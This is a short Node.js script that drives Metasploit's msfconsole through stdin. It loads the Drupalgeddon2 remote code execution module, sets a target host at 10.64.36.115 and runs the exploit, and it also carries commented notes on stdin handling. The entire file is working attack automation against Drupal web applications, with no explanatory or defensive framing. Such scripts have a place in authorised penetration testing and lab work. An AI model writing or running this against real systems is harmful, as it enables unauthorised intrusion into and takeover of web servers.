const spawn = require('child_process').spawn

let metasploit = spawn('msfconsole')

metasploit.stdin.setEncoding('utf-8')
metasploit.stdout.pipe(process.stdout)

metasploit.stdin.write('use exploit/unix/webapp/drupal_drupalgeddon2\n')
metasploit.stdin.write('set rhosts 10.64.36.115\n')
metasploit.stdin.write('run\n')

// metasploit.stdin.end() /// this call seems necessary, at least with plain node.js executable

// metasploit.stdin.write('search drupal')
